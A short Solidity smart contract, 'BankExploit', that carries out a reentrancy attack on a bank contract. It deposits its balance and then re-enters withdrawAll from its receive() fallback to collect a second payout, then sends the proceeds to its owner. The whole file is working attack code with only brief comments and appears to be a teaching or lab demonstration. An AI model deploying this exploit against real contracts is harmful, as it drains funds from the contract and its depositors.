// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./BankInterface.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";


/**
 * @title BankExploit
 * @dev Exploit a bank using the reentrance vulnerability
 * @custom:dev-run-script ./scripts/deploy_with_ethers.ts
 */
contract BankExploit is Ownable, ReentrancyGuard {
    BankInterface private bank;
    bool private lock;

    constructor(BankInterface _bank) payable Ownable(msg.sender) {
        bank = _bank;
    }

    receive() external payable {
        // If money is coming from the bank, we withdraw once more
        if (msg.sender == address(bank)) {
            if (!lock) {
                lock = true;
                bank.withdrawAll();
                lock = false;
            }
        }
    }

    // Attacking the bank doubles the contract of this balance
    function attackBank() external onlyOwner nonReentrant {
        bank.deposit{value: address(this).balance}();
        bank.withdrawAll();
    }

    // Transfer the balance of this contract to the owner
    function withdrawAll() external onlyOwner nonReentrant {
        (bool success,) = owner().call{value: address(this).balance}("");
        require(success);
    }
}
